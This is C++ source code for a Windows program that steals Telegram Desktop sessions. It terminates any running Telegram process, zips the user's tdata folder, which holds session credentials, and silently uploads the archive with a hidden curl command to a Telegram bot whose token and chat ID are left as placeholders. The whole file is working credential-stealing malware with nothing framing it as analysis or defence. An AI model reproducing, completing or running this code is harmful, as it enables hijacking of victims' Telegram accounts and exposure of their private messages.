#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <filesystem>
#include <string>
#include <cstdlib>
#include "libs/miniz.h"

namespace fs = std::filesystem;

void killTelegramIfRunning() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "Telegram.exe") == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
}

std::string getTdataPath() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
        std::string p = std::string(path) + "\\Telegram Desktop\\tdata";
        if (fs::exists(p)) return p;
    }
    return {};
}

std::string getTempZipPath() {
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) == 0) return "tdata.zip";
    return std::string(tempPath) + "tdata.zip";
}

bool zipFolder(const std::string& folder, const std::string& zipFile) {
    mz_zip_archive zip = {};
    if (!mz_zip_writer_init_file(&zip, zipFile.c_str(), 0)) return false;

    for (auto& file : fs::recursive_directory_iterator(folder)) {
        if (file.is_regular_file()) {
            std::string relative = file.path().filename().string();
            mz_zip_writer_add_file(&zip, relative.c_str(), file.path().string().c_str(), nullptr, 0, MZ_BEST_SPEED);
        }
    }

    mz_zip_writer_finalize_archive(&zip);
    mz_zip_writer_end(&zip);
    return true;
}

void sendToTelegram(const std::string& zipPath, const std::string& token, const std::string& userId) {
    std::string cmd = "cmd.exe /C curl -s -F \"document=@" + zipPath + "\" https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + userId;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::string cmdLine = cmd;
    BOOL success = CreateProcessA(
        nullptr,
        cmdLine.data(),
        nullptr, nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr, nullptr,
        &si, &pi
    );

    if (success) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    const std::string token = "TOKEN_HERE";
    const std::string userId = "USERID_HERE";

    killTelegramIfRunning();

    std::string tdata = getTdataPath();
    if (tdata.empty()) return 1;

    std::string zipPath = getTempZipPath();
    if (!zipFolder(tdata, zipPath)) return 1;

    sendToTelegram(zipPath, token, userId);
    return 0;
}
